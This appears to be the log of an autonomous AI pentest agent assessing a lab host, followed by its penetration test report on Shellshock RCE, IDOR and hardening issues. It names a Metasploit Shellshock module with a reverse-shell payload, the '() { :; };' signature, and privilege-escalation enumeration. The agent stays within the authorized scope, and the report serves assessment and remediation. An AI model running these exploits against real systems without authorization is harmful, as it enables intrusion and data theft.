@@ -1,0 +1,445 @@
+=== Autonomous Cyber Agent Controller ===
+Authorized target: ['192.168.185.3', '192.168.185.3:8080', '192.168.185.3:5000', '192.168.185.3:6379', '192.168.185.3:22', '192.168.185.3:53', '192.168.185.3:139', '192.168.185.3:445']
+Enter the task for the agent.
+
+Task> Fully assess authorized host 192.168.185.3. Begin with host-level service discovery, then enumerate each discovered service that is also in the authorized target list. Validate likely vulnerabilities only when evidence supports them. Where approved safety gates allow it, prove compromise using controlled non-destructive methods, collect read-only loot, run bounded priviledge-excalation enumeration, clean up any sessions, and produce an evidence-based final report with findings, proof, impact, and remediation.
+
+[+] Running tool: run_port_discovery
+[+] Args: {'target': '192.168.185.3'}
+
+[+] Running tool: run_ssh_enum
+[+] Args: {'target': '192.168.185.3:22', 'username': 'root'}
+
+[+] Running tool: run_http_probe
+[+] Args: {'target': '192.168.185.3:5000'}
+
+[+] Running tool: run_http_probe
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_whatweb
+[+] Args: {'target': '192.168.185.3:5000'}
+
+[+] Running tool: run_whatweb
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_gobuster_scan
+[+] Args: {'target': '192.168.185.3:5000'}
+
+[+] Running tool: run_gobuster_scan
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_nikto_scan
+[+] Args: {'target': '192.168.185.3:5000'}
+
+[+] Running tool: run_nikto_scan
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_idor_check
+[+] Args: {'target': '192.168.185.3:5000'}
+
+[+] Running tool: run_nmap_nse
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_shellshock_check
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_searchsploit_lookup
+[+] Args: {'target': '192.168.185.3:8080', 'query': 'Apache 2.4.10 Debian CGI Shellshock'}
+
+[+] Running tool: run_searchsploit_lookup
+[+] Args: {'target': '192.168.185.3:5000', 'query': 'Werkzeug 3.1.8 console'}
+
+[+] Running tool: run_metasploit
+[+] Args: {'target': '192.168.185.3:8080', 'module': 'exploit/multi/http/apache_mod_cgi_bash_env_exec', 'action': 'check'}
+
+[+] Running tool: run_metasploit
+[+] Args: {'target': '192.168.185.3:8080', 'module': 'exploit/multi/http/apache_mod_cgi_bash_env_exec', 'action': 'run', 'payload': 'linux/x86/shell/reverse_tcp'}
+
+[+] Running tool: run_loot
+[+] Args: {'target': '192.168.185.3:8080'}
+
+[+] Running tool: run_linpeas
+[+] Args: {'target': '192.168.185.3:8080'}
+
+=== FINAL REPORT ===
+
+## Assessment Report: 192.168.185.3
+
+### Scope and Method
+Authorized host-level discovery was performed against `192.168.185.3`. After discovery, only services that were both discovered and explicitly authorized were enumerated further.
+
+### Executive Summary
+The host exposes multiple services. The most significant findings are:
+
+1. **Critical: Shellshock remote command execution on Apache CGI service**
+   - Validated against `192.168.185.3:8080`.
+   - Controlled exploitation produced a shell as `www-data`.
+   - Sessions were cleaned up after proof and read-only enumeration.
+
+2. **High: Insecure Direct Object Reference in the internal user portal**
+   - Validated against `192.168.185.3:5000`.
+   - Changing `/profile/<id>` allowed access to other users’ records, including an admin record and secret.
+
+3. **Medium/Low: Outdated and weakly configured web/SSH services**
+   - Apache `2.4.10` is outdated and exposes default content.
+   - Missing common HTTP security headers.
+   - SSH advertises legacy `ssh-rsa`.
+
+---
+
+## Discovered Services
+
+| Port | Service | Version / Evidence | Assessment Status |
+|---:|---|---|---|
+| 21/tcp | FTP | `vsftpd 3.0.5` | Discovered only; not further assessed because `192.168.185.3:21` was not in the authorized target list |
+| 22/tcp | SSH | `OpenSSH 8.2p1 Ubuntu 4ubuntu0.13` | Enumerated |
+| 23/tcp | Telnet | `Linux telnetd` | Discovered only; not further assessed because `192.168.185.3:23` was not in the authorized target list |
+| 5000/tcp | HTTP | Werkzeug `3.1.8`, Python `3.9.25` | Enumerated and IDOR validated |
+| 8080/tcp | HTTP | Apache `2.4.10 (Debian)` | Enumerated, Shellshock validated and controlled exploitation performed |
+
+Authorized services that were not discovered open during port discovery, such as Redis `6379`, DNS `53`, SMB `139/445`, were not further assessed.
+
+---
+
+# Findings
+
+## 1. Critical — Shellshock Remote Command Execution on Apache CGI
+
+### Affected Target
+`http://192.168.185.3:8080/victim.cgi`
+
+### Evidence
+HTTP enumeration identified Apache and CGI-related indicators:
+
+- Server header: `Apache/2.4.10 (Debian)`
+- Web path discovery showed CGI exposure:
+  - `/cgi-bin/` returned HTTP `403`
+- Shellshock validation against `/victim.cgi` succeeded.
+
+The Shellshock validation command returned:
+
+```text
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Metasploit check also confirmed exploitability:
+
+```text
+[+] 192.168.185.3:8080 - The target is vulnerable.
+```
+
+Controlled exploitation was then performed using the approved Metasploit module:
+
+```text
+exploit/multi/http/apache_mod_cgi_bash_env_exec
+Payload: linux/x86/shell/reverse_tcp
+```
+
+The controlled proof successfully opened a session and executed `id`; proof output was detected. Sessions were explicitly cleaned up using `sessions -K`, and the tool reported:
+
+```text
+session_opened: true
+session_cleanup_attempted: true
+session_closed: true
+```
+
+### Impact
+An unauthenticated attacker can execute arbitrary commands as the web server user `www-data`. This provides a foothold on the host and may allow:
+
+- Reading local files accessible to `www-data`
+- Pivoting to other local services
+- Credential discovery
+- Privilege escalation attempts
+- Full host compromise if additional local weaknesses are present
+
+### Remediation
+- Patch Bash immediately to a version not vulnerable to CVE-2014-6271 and related Shellshock variants.
+- Remove or disable vulnerable CGI scripts.
+- Restrict CGI execution where not required.
+- Upgrade Apache and the underlying Debian packages.
+- Add WAF or reverse proxy filtering for Shellshock payload patterns as a compensating control, but do not rely on this instead of patching.
+- Review logs for suspicious `User-Agent`, `Referer`, or custom header values containing Bash function syntax such as:
+
+```text
+() { :; };
+```
+
+---
+
+## 2. High — Insecure Direct Object Reference in Internal User Portal
+
+### Affected Target
+`http://192.168.185.3:5000/profile/<user_id>`
+
+### Evidence
+The application landing page exposed profile links and hints:
+
+```html
+<h1>Internal User Portal</h1>
+<p>Your profile: <a href='/profile/2'>View my profile</a></p>
+<p>Try: /profile/1, /profile/2, /profile/3</p>
+```
+
+The IDOR validation confirmed that changing the numeric profile ID allowed access to multiple distinct user records without changing authorization context.
+
+Accessible profiles:
+
+```text
+/profile/1
+/profile/2
+/profile/3
+```
+
+Returned records included:
+
+```json
+{
+  "user_id": 1,
+  "data": "user=alice,role=admin,secret=FLAG{adas_hard_vm3_pwned}\n"
+}
+```
+
+```json
+{
+  "user_id": 2,
+  "data": "user=bob,role=user,notes=normal account\n"
+}
+```
+
+```json
+{
+  "user_id": 3,
+  "data": "user=charlie,role=user,notes=normal account\n"
+}
+```
+
+The validation result reported:
+
+```text
+validated_vulnerability: Insecure Direct Object Reference
+unauthorized_access_possible: true
+authorization_context_changed: false
+returned_unique_records: true
+```
+
+### Impact
+An attacker can access other users’ profile data by modifying the profile ID in the URL. In this case, the flaw exposed an admin user record and a secret value.
+
+Potential impact includes:
+
+- Unauthorized disclosure of user data
+- Exposure of secrets or flags
+- Potential privilege abuse if admin-only records or actions are reachable
+- Violation of access-control and privacy requirements
+
+### Remediation
+- Enforce object-level authorization checks on every request.
+- Do not rely on hidden links or client-side controls to protect object access.
+- Ensure authenticated users can only access objects they own or are explicitly authorized to view.
+- Use non-enumerable identifiers where appropriate, but treat this as defense-in-depth only.
+- Add automated access-control tests for horizontal and vertical privilege escalation cases.
+
+---
+
+## 3. Medium — Outdated Apache HTTP Server
+
+### Affected Target
+`192.168.185.3:8080`
+
+### Evidence
+Service and web fingerprinting identified:
+
+```text
+Apache/2.4.10 (Debian)
+```
+
+Nikto reported:
+
+```text
+Apache/2.4.10 appears to be outdated
+```
+
+SearchSploit lookup for the specific Apache/CGI/Shellshock context returned no direct local exploit result, but Shellshock was independently validated through CGI behavior.
+
+Nmap NSE vulnerability scan against port `8080` did not return additional script findings.
+
+### Impact
+Running outdated Apache increases exposure to known vulnerabilities and weak default configurations. While Apache itself was not independently proven vulnerable to a separate CVE during this assessment, the outdated CGI-enabled stack directly contributed to the Shellshock attack path.
+
+### Remediation
+- Upgrade Apache to a currently supported version.
+- Apply Debian security updates.
+- Remove default Apache pages and sample files.
+- Disable unused Apache modules, especially CGI-related modules if not required.
+- Maintain a regular patch-management process.
+
+---
+
+## 4. Low/Medium — Apache Default Content and Information Disclosure
+
+### Affected Target
+`192.168.185.3:8080`
+
+### Evidence
+HTTP probing returned the default Debian Apache page:
+
+```html
+<title>Apache2 Debian Default Page: It works</title>
+```
+
+Gobuster discovered:
+
+```text
+/index.html      HTTP 200
+/cgi-bin/        HTTP 403
+/server-status   HTTP 403
+/icons/README    Reported by Nikto
+```
+
+Nikto also reported ETag inode leakage:
+
+```text
+Server may leak inodes via ETags
+```
+
+### Impact
+Default content and unnecessary exposed paths reveal implementation details and may help attackers fingerprint the environment or discover additional attack surface.
+
+### Remediation
+- Remove default Apache index pages and sample files.
+- Restrict or disable `/server-status`.
+- Remove `/icons/README` or restrict access.
+- Configure ETags to avoid leaking inode information, for example:
+
+```apache
+FileETag MTime Size
+```
+
+or disable ETags where appropriate.
+
+---
+
+## 5. Low — Missing HTTP Security Headers
+
+### Affected Targets
+- `192.168.185.3:5000`
+- `192.168.185.3:8080`
+
+### Evidence
+Nikto reported missing headers on both web services:
+
+```text
+X-Frame-Options header is not present
+X-Content-Type-Options header is not set
+```
+
+### Impact
+Missing headers can increase exposure to browser-side attacks such as clickjacking and MIME-sniffing issues. These are defense-in-depth controls and were not used as a compromise path during this assessment.
+
+### Remediation
+Set the following headers where appropriate:
+
+```http
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: no-referrer
+Content-Security-Policy: default-src 'self'
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+```
+
+For Flask/Werkzeug applications, consider using middleware such as Flask-Talisman or equivalent secure header configuration.
+
+---
+
+## 6. Low — Legacy SSH Algorithm Advertised
+
+### Affected Target
+`192.168.185.3:22`
+
+### Evidence
+SSH enumeration identified:
+
+```text
+OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
+```
+
+Supported authentication methods:
+
+```text
+publickey
+password
+```
+
+Host-key algorithms included:
+
+```text
+ssh-rsa
+```
+
+The tool flagged:
+
+```text
+legacy_algorithms_detected: ssh-rsa
+```
+
+### Impact
+Advertising legacy `ssh-rsa` can allow weaker cryptographic negotiation with older clients and may violate modern hardening baselines.
+
+No SSH authentication bypass, credential weakness, or command execution was validated during this assessment.
+
+### Remediation
+- Disable legacy `ssh-rsa` where compatibility allows.
+- Prefer modern algorithms such as Ed25519 and RSA-SHA2.
+- Disable password authentication if operationally feasible and require key-based authentication.
+- Ensure root SSH login is disabled.
+- Maintain OpenSSH security updates.
+
+---
+
+# Post-Exploitation and Cleanup
+
+A controlled Shellshock foothold was obtained as `www-data`.
+
+Read-only evidence collection was performed through the approved tooling. The collection included:
+
+- `id`
+- `hostname`
+- `uname -a`
+- `/etc/os-release`
+- Network interface information
+
+Read-only privilege-escalation enumeration was also performed and included:
+
+- Current identity
+- Kernel information
+- `sudo -n -l`
+- SUID binary discovery
+- Writable directory checks
+- `/etc/passwd` collection
+
+No destructive actions or persistence were performed. Metasploit sessions were explicitly terminated, and the tool reported session cleanup completed.
+
+---
+
+# Overall Risk Rating
+
+**Critical**
+
+The host is vulnerable to unauthenticated remote command execution through Shellshock on the Apache CGI endpoint. Combined with the IDOR flaw on the internal portal and outdated web stack, the system is at high risk of compromise and sensitive data exposure.
+
+---
+
+# Prioritized Remediation Plan
+
+1. **Immediately patch Bash and disable vulnerable CGI scripts.**
+2. **Remove or restrict `/victim.cgi` and any unnecessary CGI capability.**
+3. **Upgrade Apache and Debian packages.**
+4. **Fix object-level authorization in the Werkzeug/Flask user portal.**
+5. **Remove exposed secrets from user profile responses and rotate any affected secrets.**
+6. **Remove default Apache content and restrict administrative/status paths.**
+7. **Add secure HTTP headers across both web services.**
+8. **Harden SSH configuration by disabling legacy algorithms and, if possible, password authentication.**
+9. **Review web server and system logs for evidence of prior Shellshock exploitation.**
+10. **Re-test after remediation to confirm Shellshock and IDOR are no longer exploitable.**
+
+[+] Structured report written to: C:\Users\author1\Documents\GitHub\cyber-agent-project\controller\reports\report_20260716T021920Z.md
